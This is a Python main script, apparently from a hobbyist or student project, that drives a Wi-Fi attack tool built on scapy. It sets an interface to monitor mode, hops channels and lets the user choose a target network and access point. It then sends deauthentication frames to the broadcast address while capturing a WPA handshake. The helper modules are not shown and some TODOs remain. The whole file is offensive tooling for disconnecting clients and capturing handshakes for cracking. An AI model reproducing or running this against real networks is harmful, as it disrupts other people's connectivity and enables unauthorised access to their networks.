"""
The main file for our program
Requires scapy 2.4.2, installable using `pip3 install scapy`
"""

import sys
import time

from scapy.layers.dot11 import Dot11FCS

import utilities
# Dot11Type = Dot11
from ap_sniffer import APSniffer
from channel_hopper import ChannelHopper
from deauth_sender import DeauthSender
from handshake_sniffer import HandshakeSniffer

# TODO Find out when this is which
Dot11Type = Dot11FCS

# Global used variables
networks = []  # All found networks (essids)
sniff_thread = None  # The thread used for sniffing APs
deauth_thread = None  # The thread used for sending out deauth packages
selected_network = None  # The network to attack
selected_ap = None  # The access point to attack


# The main function that will run on program start
def main():
    global iface, selected_network, selected_ap, deauth_thread

    utilities.require_root()

    utilities.initialize_mac_data()

    # Capture CTRL-C
    # signal.signal(signal.SIGINT, catch_exceptions)

    iface = input("Please specify the interface: ")
    utilities.set_mon_mode(iface, "monitor")

    channel_hopper_thread = ChannelHopper(iface)
    channel_hopper_thread.start()

    selected_network = select_network()
    selected_ap = select_ap()

    print("")
    print("You were going to attack the following network and this specific AP:")
    print(selected_network)
    print(selected_ap)
    print("")

    print("AP converted: ", utilities.convert_mac(selected_ap.bssid))

    sniff_handshake(selected_ap.bssid, "ff:ff:ff:ff:ff:ff")  # TODO Select victim
    # TODO Capture handshake

    channel_hopper_thread.stop = True
    channel_hopper_thread.join()

    print("Done running, exiting")

    finalize()


# Process for having the user select which Network to attack
def select_network():
    global sniff_thread, networks, iface, Dot11Type

    print("")
    print("Please specify the ID of the Network that you want to attack:")
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_networks=True)
    sniff_thread.start()
    network_id = int(input())

    sniff_thread.shutdown = True
    sniff_thread.join()

    # TODO Check for wrong user input
    print("You selected Network ", network_id)
    return networks[network_id]


# Process for having the user select which AP to attack
def select_ap():
    global sniff_thread, iface, networks, Dot11Type, selected_network

    print("")
    print("Please specify the ID of the AP that you want to attack:")
    for ap in selected_network.aps:
        print(ap)
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network=selected_network)
    sniff_thread.start()
    ap_id = int(input())

    sniff_thread.shutdown = True
    sniff_thread.join()

    # TODO Check for wrong user input
    print("You selected AP ", ap_id)
    return selected_network.aps[ap_id]


# Sends deauth attacks
def deauth(target_network, target_client):
    global iface, deauth_thread

    input("Press enter to start sending deauth")
    deauth_start(target_network, target_client)
    input("Press enter to stop sending deauth")
    deauth_stop()


def deauth_start(target_network, target_client):
    global deauth_thread

    deauth_thread = DeauthSender(iface, selected_ap.bssid, target_client)
    deauth_thread.start()


def deauth_stop():
    global deauth_thread

    deauth_thread.stop = True
    deauth_thread.join()


# Sniff a handshake
def sniff_handshake(target_network, target_client):
    global iface, selected_ap

    input("Press enter to start sniffing a handshake")
    deauth_start(target_network, target_client)
    handshake_sniffer_thread = HandshakeSniffer(iface)
    handshake_sniffer_thread.start()

    time.sleep(3)
    deauth_stop()
    handshake_sniffer_thread.join()


# Executed when signal catches an exception (like CTRL+C) during runtime
def catch_exceptions(signal, frame):
    finalize()


# Clean up and shut down
def finalize():
    global iface

    utilities.print_networks_stats(networks)
    utilities.set_mon_mode(iface, "managed")
    sys.exit(0)


# Run the script
if __name__ == '__main__':
    main()
